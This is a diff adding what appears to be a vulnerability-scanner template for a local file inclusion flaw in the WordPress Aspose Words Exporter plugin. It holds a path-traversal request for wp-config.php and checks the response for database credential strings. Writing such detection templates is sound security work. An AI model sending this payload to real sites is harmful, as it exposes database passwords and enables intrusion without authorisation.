@@ -1,0 +1,28 @@
+id: aspose-words-file-download
+brief:
+    title: WordPress Aspose Words Exporter <2.0 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.
+    label:
+        - wordpress
+        - wp-plugin
+        - lfi
+        - aspose
+        - wpscan
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
